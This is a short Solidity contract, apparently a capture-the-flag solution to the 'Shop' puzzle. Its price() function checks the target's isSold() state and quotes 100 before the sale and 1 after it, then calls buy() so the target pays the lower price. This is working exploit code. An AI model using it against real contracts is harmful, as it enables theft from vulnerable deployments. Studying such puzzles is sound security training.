// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IShop {
    function buy() external;
}

contract ShopAttack {
    bool public firstCall = true;
    IShop public shop;

    constructor(address targetContract) {
        shop = IShop(targetContract);
    }

    function price() external view returns (uint256) {
        // 读取商店的 isSold 状态
        (bool success, bytes memory data) = address(shop).staticcall(abi.encodeWithSignature("isSold()"));
        if (success && abi.decode(data, (bool))) {
            return 1; // 已经卖出，返回低价
        } else {
            return 100; // 尚未卖出，返回高价
        }
    }

    function attack() external {
        shop.buy();
    }
}
